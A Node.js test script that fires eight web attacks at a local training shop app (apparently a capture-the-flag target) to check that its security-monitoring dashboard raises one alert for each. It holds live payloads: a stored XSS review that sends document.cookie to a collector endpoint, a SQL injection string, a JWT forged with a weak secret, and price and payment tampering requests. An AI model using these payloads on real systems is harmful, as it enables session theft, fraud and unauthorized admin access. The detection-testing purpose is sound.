const io = require('socket.io-client');
const http = require('http');

const BACKEND_URL = process.env.BACKEND_URL || 'http://127.0.0.1:3000';
const SHOP_URL = process.env.SHOP_URL || 'http://127.0.0.1:5173';

function request(method, path, body = null, token = null) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BACKEND_URL);
    const req = http.request(url, {
      method,
      headers: {
        'Content-Type': 'application/json',
        ...(token ? { 'Cookie': `session=${token}` } : {})
      }
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(JSON.stringify(body));
    req.end();
  });
}

async function run() {
  console.log("--- BUGDROP SOC COVERAGE TEST ---");
  const socket = io(BACKEND_URL, { transports: ['websocket'] });
  
  const alerts = [];
  socket.on('http-log', (log) => {
    if (log.threats) {
      log.threats.forEach(t => {
        alerts.push(t.tag);
        console.log(`[ALERT] ${t.tag}`);
      });
    }
  });

  await new Promise(r => socket.on('connect', r));
  console.log("✅ Socket connected");

  // Get user token
  const loginRes = await request('POST', '/api/auth/login', { username: 'collector_42', password: 'bugdrop2024' });
  const cookie = loginRes.body.match(/"token":"([^"]+)"/)?.[1];
  
  // 1. Price Tampering (Cart)
  await request('POST', '/api/cart/checkout', [{ product_id: 1, quantity: 1, unit_price: 0 }], cookie);
  
  // 2. Info Disclosure (/backup.bak)
  await request('GET', '/backup.bak');
  
  // 3. Fuzzing / Enumeration (ráfaga de 404)
  for(let i=0; i<5; i++) {
    await request('GET', '/api/not_found_' + i);
  }
  
  // 4. XSS & Exfiltration (bot)
  const nonce = Math.random().toString(36).substring(2);
  await request('POST', '/api/products/1/reviews', {
    rating: 5,
    content: `<img src=x onerror='fetch("http://localhost:3000/api/ctf/collector?c="+document.cookie+"&n=${nonce}")'>`
  }, cookie);
  
  // 5. IDOR (GET /api/orders/1)
  await request('GET', '/api/orders/1', null, cookie);
  
  // 6. Payment Bypass
  const orderRes = await request('POST', '/api/cart/checkout', [{ product_id: 1, quantity: 1, unit_price: 99 }], cookie);
  const orderId = JSON.parse(orderRes.body).order_id;
  await request('POST', `/api/orders/${orderId}/pay`, { status: "success" }, cookie);
  
  // 7. SQLi
  await request('POST', '/api/newsletter', { email: "admin' OR 1=1--" });
  
  // 8. Forged JWT
  const jwt = require('jsonwebtoken');
  const forgedToken = jwt.sign({ id: 1, username: 'admin', role: 'admin', jti: 'fake' }, '123456');
  await request('GET', '/api/admin/dashboard', null, forgedToken);
  
  console.log("Waiting for alerts to collect... (up to 20s for Exfiltration)");
  
  const expected = [
    'Price Tampering', 'Info Disclosure', 'Fuzzing / Enumeration', 
    'XSS', 'Exfiltration', 'IDOR', 'Payment Bypass', 'SQLi', 'Forged JWT'
  ];
  
  for(let wait=0; wait<20; wait++) {
    const counts = {};
    alerts.forEach(a => { counts[a] = (counts[a] || 0) + 1; });
    const allFound = expected.every(t => counts[t] === 1);
    if (allFound) break;
    await new Promise(r => setTimeout(r, 1000));
  }
  
  const counts = {};
  alerts.forEach(a => { counts[a] = (counts[a] || 0) + 1; });
  let failed = false;
  for (const tag of expected) {
    const count = counts[tag] || 0;
    if (count === 1) {
      console.log(`✅ ${tag}: 1`);
    } else {
      console.error(`❌ ${tag}: expected 1, got ${count}`);
      failed = true;
    }
  }
  
  socket.disconnect();
  if (failed) {
    process.exit(1);
  } else {
    console.log("✅ All SOC alerts generated perfectly!");
    process.exit(0);
  }
}

run().catch(e => {
  console.error(e);
  process.exit(1);
});
